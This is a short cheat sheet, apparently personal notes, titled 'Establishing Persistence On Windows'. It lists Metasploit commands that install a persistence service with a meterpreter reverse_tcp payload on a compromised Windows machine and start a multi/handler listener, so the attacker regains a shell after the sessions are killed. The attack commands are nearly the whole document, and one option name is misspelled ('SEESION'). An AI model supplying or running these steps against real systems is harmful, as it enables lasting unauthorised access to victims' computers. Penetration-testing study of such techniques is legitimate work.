# Establishing Persistence On Windows
  - __`search platform:windows persistence`__

```
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SEESION 1
exploit
```
__If you kill the all session also i can get the access to the target system__

```
use exploit/multi/handler
set LHOST eth1
exploit
```
> __you will get the access without doing anything__
